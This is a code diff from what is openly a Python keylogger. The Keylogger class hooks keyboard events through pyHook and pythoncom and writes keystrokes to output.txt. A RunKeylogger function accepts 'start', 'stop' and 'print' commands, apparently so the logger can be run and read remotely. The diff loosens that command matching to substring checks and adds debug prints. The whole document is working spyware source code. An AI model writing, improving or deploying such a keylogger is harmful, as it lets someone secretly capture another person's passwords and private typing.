@@ -40,20 +40,20 @@ class Keylogger:
             
     def startWrite(self):
         state = self.state
-        if state.lower() == "start" and self.action == False:
+        if "start".lower() in state.lower() and self.action == False:
             open('output.txt', 'w')
             self.action = True
             self.hm.KeyDown= self.OnKeyboardEvent
             self.hm.HookKeyboard()
             pythoncom.PumpMessages()
-        elif state.lower() == "stop" and self.action == False:
+        elif "stop".lower() in state.lower() and self.action == False:
             return
         time.sleep(2)
 
     def stopKey(self):
         while True:
             state = self.state
-            if state.lower() == "stop" and self.action == True:
+            if "stop".lower() in state.lower() and self.action == True:
                 self.action = False
                 self.hm.UnhookKeyboard()
                 return
@@ -65,15 +65,18 @@ class Keylogger:
 
 keylogger =  Keylogger()
 def RunKeylogger(rawMsg : str):
+    global keylogger
+    print("khanh day:",rawMsg)
+    rawMsg = str(rawMsg)
     res = "1"
     try:
-        if rawMsg.lower() != "start" and rawMsg.lower() != "stop" and rawMsg.lower() != "print":
+        if "start".lower() not in rawMsg.lower()  and  "stop".lower() not in rawMsg.lower() and  "print".lower() not in rawMsg.lower():
             res = "BODY IS NOT VALID"
-        if rawMsg.lower() == "start" or rawMsg.lower() == "stop":
+        if "start".lower() in rawMsg.lower() or  "stop".lower() in rawMsg.lower():
             keylogger.setState(rawMsg)
-        if keylogger.getState().lower() == "start" and keylogger.getAction() == False:
+        if "start".lower() in rawMsg.lower() and keylogger.getAction() == False:
             keylogger.runKeylogger()
-        if rawMsg.lower() == "print":
+        if "print".lower() in rawMsg.lower() :
             res = printKeylogger("output.txt")
         return ["1", res]
     except:
@@ -92,6 +95,7 @@ def printKeylogger(filename):
 #         f =  open("text.txt","r")
 #         k = f.readline()
 #         res = RunKeylogger(k)
+#         print(res)
 #         os.system('cls')
 #         print(res)
 #         f.close()
